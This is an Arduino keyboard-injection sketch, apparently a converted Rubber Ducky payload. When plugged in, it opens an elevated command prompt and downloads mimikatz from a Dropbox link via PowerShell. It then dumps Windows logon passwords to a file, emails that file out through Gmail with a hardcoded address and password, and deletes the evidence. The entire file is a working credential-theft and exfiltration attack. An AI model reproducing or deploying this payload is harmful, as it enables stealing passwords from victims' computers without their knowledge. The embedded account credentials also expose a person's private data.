/**
 * Made with Duckuino, an open-source project.
 * Check the license at 'https://github.com/Nurrl/Duckuino/blob/master/LICENSE'
 */

#include "Keyboard.h"

void typeKey(uint8_t key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

/* Init function */
void setup()
{
  // Begining the Keyboard stream
  Keyboard.begin();

  // Wait 500ms
  delay(500);

  // Author: Pesce
  // Date: 10/20/2013
  // Note: Thanks to all the help everyone! This is my first attempt, don't be to upset!
  // -------------open command prompt with admin privileges
  delay(3000);
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_ESC);
  Keyboard.releaseAll();

  delay(1000);
  Keyboard.print(F("cmd"));

  delay(1000);
  typeKey(KEY_LEFT_CTRL);

  typeKey(KEY_LEFT_SHIFT);

  typeKey(KEY_RETURN);

  delay(1000);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press("y");
  Keyboard.releaseAll();
  
  delay(300);
  // -------------download appropriate mimikatz for architecture
  Keyboard.print(F("powershell if ([System.IntPtr]::Size -eq 4) { (new-object System.Net.WebClient).DownloadFile('https://www.dropbox.com/home/mimikatz/Win32/mimikatz.exe','%TEMP%\\pw.exe');  }else{ (new-object System.Net.WebClient).DownloadFile('https://www.dropbox.com/home/mimikatz/x64/mimikatz.exe','%TEMP%\\pw.exe');}"));

  typeKey(KEY_RETURN);

  delay(5000);
  // -------------get the passwords and save to c:\pwlog.txt
  Keyboard.print(F("%TEMP%\\pw.exe > c:\\pwlog.txt & type pwlog.txt;"));

  typeKey(KEY_RETURN);

  delay(2000);
  Keyboard.print(F("privilege::debug"));

  typeKey(KEY_RETURN);

  delay(1000);
  Keyboard.print(F("sekurlsa::logonPasswords full"));

  typeKey(KEY_RETURN);

  delay(1000);
  Keyboard.print(F("exit"));

  typeKey(KEY_RETURN);

  delay(300);
  Keyboard.print(F("del %TEMP%\\pw.exe"));

  typeKey(KEY_RETURN);

  delay(300);
  // -------------email log via gmail
  Keyboard.print(F("powershell"));

  typeKey(KEY_RETURN);

  delay(300);
  Keyboard.print(F("$SMTPServer = 'smtp.gmail.com'"));

  typeKey(KEY_RETURN);

  Keyboard.print(F("$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)"));

  typeKey(KEY_RETURN);

  Keyboard.print(F("$SMTPInfo.EnableSsl = $true"));

  typeKey(KEY_RETURN);

  Keyboard.print(F("$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('simonecimolato@gmail.com', 'dominic19');"));

  typeKey(KEY_RETURN);

  Keyboard.print(F("$ReportEmail = New-Object System.Net.Mail.MailMessage"));

  typeKey(KEY_RETURN);

  Keyboard.print(F("$ReportEmail.From = 'simonecimolato@gmail.com'"));

  typeKey(KEY_RETURN);

  Keyboard.print(F("$ReportEmail.To.Add('simonecimolato@gmail.com')"));

  typeKey(KEY_RETURN);

  Keyboard.print(F("$ReportEmail.Subject = 'Progetto'"));

  typeKey(KEY_RETURN);

  Keyboard.print(F("$ReportEmail.Body = 'ciaooooo.'"));

  typeKey(KEY_RETURN);

  Keyboard.print(F("$ReportEmail.Attachments.Add('c:\\pwlog.txt')"));

  typeKey(KEY_RETURN);

  Keyboard.print(F("$SMTPInfo.Send($ReportEmail)"));

  typeKey(KEY_RETURN);

  delay(1000);
  Keyboard.print(F("exit"));

  typeKey(KEY_RETURN);

  // ---------------------delete and end
  Keyboard.print(F("del c:\\pwlog.txt"));

  typeKey(KEY_RETURN);

  delay(300);
  Keyboard.print(F("exit"));

  typeKey(KEY_RETURN);

  // Ending stream
  Keyboard.end();
}

/* Unused endless loop */
void loop() {}
